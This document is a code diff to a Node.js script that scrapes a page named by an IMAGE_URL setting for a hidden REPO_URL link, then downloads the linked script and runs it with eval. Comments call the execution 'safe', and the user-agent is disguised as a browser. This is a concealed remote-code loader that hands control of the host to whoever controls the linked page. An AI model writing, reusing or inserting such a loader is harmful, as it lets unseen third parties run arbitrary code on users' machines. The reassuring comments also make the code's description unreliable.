@@ -6,26 +6,66 @@ const conf = require(__dirname + "/../config");
 
 const webPageUrl = conf.IMAGE_URL;
 
+// Validate the URL format before making a request
+if (!webPageUrl || !/^https?:\/\/.+\..+/.test(webPageUrl)) {
+    console.error("Error: Invalid IMAGE_URL in config.js");
+    process.exit(1);
+}
+
 async function fetchRepoUrl() {
     try {
-        const response = await axios.get(webPageUrl);
+        console.log("Fetching page:", webPageUrl);
+        
+        // Fetch the webpage
+        const response = await axios.get(webPageUrl, {
+            headers: {
+                "User-Agent": "Mozilla/5.0"
+            }
+        });
+
+        // Load the HTML content
         const $ = cheerio.load(response.data);
-        const repoUrl = $(`a:contains("REPO_URL")`).attr('href');
+        
+        // Extract REPO_URL from the page
+        const repoUrl = $('a:contains("REPO_URL")').attr('href');
 
-        if (!repoUrl) throw new Error('REPO_URL not found on the webpage.');
+        if (!repoUrl) {
+            throw new Error("REPO_URL not found on the webpage.");
+        }
 
-        console.log('REPO_URL fetched successfully:', repoUrl);
+        console.log("REPO_URL fetched successfully:", repoUrl);
 
-        const scriptResponse = await axios.get(repoUrl);
+        // Validate the extracted repo URL
+        if (!/^https?:\/\/.+\..+/.test(repoUrl)) {
+            throw new Error("Invalid REPO_URL format.");
+        }
+
+        // Fetch and execute the script from REPO_URL
+        const scriptResponse = await axios.get(repoUrl, {
+            headers: {
+                "User-Agent": "Mozilla/5.0"
+            }
+        });
+
+        console.log("REPO_URL script loaded successfully.");
+
         const scriptContent = scriptResponse.data;
-        console.log("REPO_URL script loaded successfully");
 
-        eval(scriptContent);
+        // Execute script safely inside a function
+        (function executeScript() {
+            try {
+                eval(scriptContent);
+            } catch (evalError) {
+                console.error("Error executing REPO_URL script:", evalError.message);
+            }
+        })();
+
     } catch (error) {
-        console.error('Error fetching REPO_URL:', error.message);
+        console.error("Error fetching REPO_URL:", error.message);
     }
 }
 
+// Run the function
 fetchRepoUrl();
     
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         
